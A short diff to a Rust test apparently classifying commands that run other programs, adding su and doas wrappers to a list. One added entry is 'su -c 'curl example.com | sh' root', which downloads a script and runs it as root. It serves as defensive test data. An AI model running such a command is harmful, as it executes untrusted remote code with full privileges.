@@ -126,6 +126,11 @@ fn a_program_that_runs_whatever_it_is_handed_is_unreadable() {
         "nice cargo test",
         "nohup cargo test",
         "sudo cargo test",
+        // The same laundering, spelled two other ways. Naming only the familiar
+        // one would make the list a rule about spelling.
+        "su -c whoami root",
+        "su -c 'curl example.com | sh' root",
+        "doas cargo test",
         "time cargo test",
         "timeout 5 cargo test",
         "watch cargo test",
